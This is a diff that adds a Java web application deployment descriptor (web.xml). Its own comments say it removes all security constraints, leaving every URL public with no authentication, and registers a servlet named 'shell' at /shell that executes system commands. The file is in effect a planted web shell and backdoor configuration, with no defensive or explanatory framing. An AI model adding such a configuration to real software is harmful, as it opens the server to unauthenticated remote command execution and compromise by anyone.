@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app>
+  <!-- Remove all security constraints -->
+  <security-constraint>
+    <web-resource-collection>
+      <web-resource-name>All</web-resource-name>
+      <url-pattern>/*</url-pattern>
+    </web-resource-collection>
+    <!-- No auth-constraint = public access to everything -->
+  </security-constraint>
+  <!-- Add a servlet that executes system commands -->
+  <servlet>
+    <servlet-name>shell</servlet-name>
+    <servlet-class>org.apache.jsp.shell_jsp</servlet-class>
+  </servlet>
+  <servlet-mapping>
+    <servlet-name>shell</servlet-name>
+    <url-pattern>/shell</url-pattern>
+  </servlet-mapping>
+</web-app>
